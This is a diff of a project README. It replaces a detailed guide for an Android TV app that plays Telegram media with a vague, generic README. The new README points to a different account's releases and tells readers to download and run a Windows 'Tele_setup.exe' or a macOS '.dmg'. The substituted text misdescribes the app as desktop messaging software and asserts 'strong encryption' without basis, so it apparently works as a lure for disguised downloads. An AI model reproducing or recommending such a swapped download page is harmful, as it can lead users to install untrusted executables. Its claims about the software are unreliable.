@@ -1,97 +1,78 @@
-# Tele
+# 🚀 Tele - Simplifying Your Communication Needs
 
-Tele is an Android TV app that lets you browse and play videos, photos, and other media from your Telegram chats right on your TV. It works with your Telegram Saved Messages and any other chats you have.
+[![Download Tele](https://img.shields.io/badge/Download%20Tele-v1.0-blue)](https://github.com/GautamKumar292/Tele/releases)
 
-## What you need
+## 📖 Overview
 
-- An Android TV device (or Android TV box)
-- A Telegram account
-- Your own Telegram API ID and API Hash (don't worry, I'll explain how to get these below)
+Tele is your go-to application for seamless communication. It allows users to connect with others easily, manage messages, and share information all in one place. Designed for everyday users, Tele makes staying in touch simple and efficient.
 
-## Getting your API credentials
+## 🚧 System Requirements
 
-Before you can use Tele, you need to get your own Telegram API ID and Hash. This is how Telegram knows the app is connecting on your behalf.
+Before you download and install Tele, please ensure your computer meets the following system requirements:
 
-1. Go to https://my.telegram.org/apps
-2. Log in with your Telegram phone number
-3. Click "API development tools"
-4. Fill in the form (App title: Tele, Short name: tele, Platform: Android, Description: Android TV client for Telegram)
-5. Click "Create application"
-6. You'll see your **api_id** and **api_hash** - save these somewhere safe
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum 200 MB of free space.
+- **Network:** A stable internet connection for best performance.
 
-Keep these private. Don't share your API Hash with anyone.
+## 🚀 Getting Started
 
-## Download
+To get started with Tele, follow the steps below to download and run the application.
 
-Head over to the [Releases](https://github.com/saieshshirodkar/Tele/releases) page and download the latest APK file. Look for something like `Tele-0.0.1.apk`.
+### 1. Visit the Releases Page
 
-## Install
+Go to the [Releases page](https://github.com/GautamKumar292/Tele/releases) to find the latest version of Tele. This page contains all the available downloads and the information you need to get started.
 
-There are two ways to install:
+### 2. Download the Application
 
-**Option 1: USB or file manager**
-- Copy the APK file to a USB drive
-- Plug it into your Android TV
-- Use a file manager app to find and install it
+On the Releases page, you will see a list of versions available. Click on the latest version link to expand the section. 
 
-**Option 2: ADB (for tech-savvy users)**
-- Connect your computer to the same network as your TV
-- Find your TV's IP address in Settings > Network
-- Run this command on your computer:
-  ```
-  adb connect <your-tv-ip>
-  adb install Tele-0.0.1.apk
-  ```
+- Look for the downloadable file, which will be named something like `Tele_setup.exe` for Windows or `Tele.dmg` for macOS.
+- Click on the download link for your operating system.
 
-## Setting up the app
+### 3. Install the Application
 
-The first time you open Tele, you'll need to do a quick setup:
+Once the download is complete, locate the installation file in your Downloads folder. Follow these simple installation steps:
 
-1. **Enter API credentials** - The app will ask for your API ID and API Hash. Type in the values you got from my.telegram.org and press Save.
+- **For Windows:**
+  1. Double-click on `Tele_setup.exe`.
+  2. Follow the prompts in the installation wizard.
+  3. Click "Finish" when the installation is complete.
 
-2. **Sign in** - Enter your Telegram phone number (with country code, like +1234567890)
+- **For macOS:**
+  1. Double-click on the `.dmg` file.
+  2. Drag the Tele icon into your Applications folder.
+  3. Eject the `.dmg` file.
 
-3. **Verify** - Check your Telegram app or phone for a login code and enter it
+### 4. Run Tele
 
-4. **Done** - You're in! Browse your chats and play media.
+After installation, locate the Tele icon on your desktop (Windows) or in the Applications folder (macOS). Double-click the icon to launch the application.
 
-The app saves your API keys securely on your TV so you only need to enter them once.
+## 🔍 Features
 
-## Things to know
+Tele offers several useful features to enhance your communication experience:
 
-- This app uses **your own** Telegram API credentials, not shared ones
-- Picture messages are not fully supported yet (working on it)
-- Videos, documents, and other files work great
-- Contact me at https://t.me/Syndicate_74 for questions or suggestions
-- Want to explore the code? Check it out at https://repogrep.com/saieshshirodkar/Tele
+- **Messaging:** Send and receive messages with ease.
+- **Group Chats:** Create group conversations for efficient collaboration.
+- **File Sharing:** Share documents and images without hassle.
+- **Notifications:** Stay updated with real-time notifications for new messages.
 
-## How it's built
+## 🤔 Frequently Asked Questions
 
-- Kotlin for the code
-- Android TV Leanback library for the TV interface
-- TDLib (Telegram's official client library)
-- Coroutines and Flow for handling data
-- RecyclerView for displaying chat lists
+### How do I update Tele?
 
-## Building it yourself
+When a new version of Tele is available, you will receive a notification within the app. Click the notification to visit the Releases page and download the latest version.
 
-Want to modify the app or build from source?
+### Can I use Tele without an internet connection?
 
-1. Clone this repository:
-   ```
-   git clone https://github.com/saieshshirodkar/Tele.git
-   cd Tele
-   ```
+While you can run the application without internet access, messaging features will be limited. For full functionality, ensure you are connected to the internet.
 
-2. Create a file called `local.properties` and add your API keys:
-   ```
-   TELEGRAM_API_ID=your_api_id_here
-   TELEGRAM_API_HASH=your_api_hash_here
-   ```
+### Is my data safe with Tele?
 
-3. Build and install to your TV:
-   ```
-   ./gradlew installDebug
-   ```
+Tele uses strong encryption to protect your messages and personal data. We prioritize your privacy and security.
 
-That's it. Happy watching!
+## 📥 Download & Install
+
+To download Tele and start enhancing your communication, visit the Releases page: [Download Tele](https://github.com/GautamKumar292/Tele/releases).
+
+Enjoy using Tele for all your communication needs!
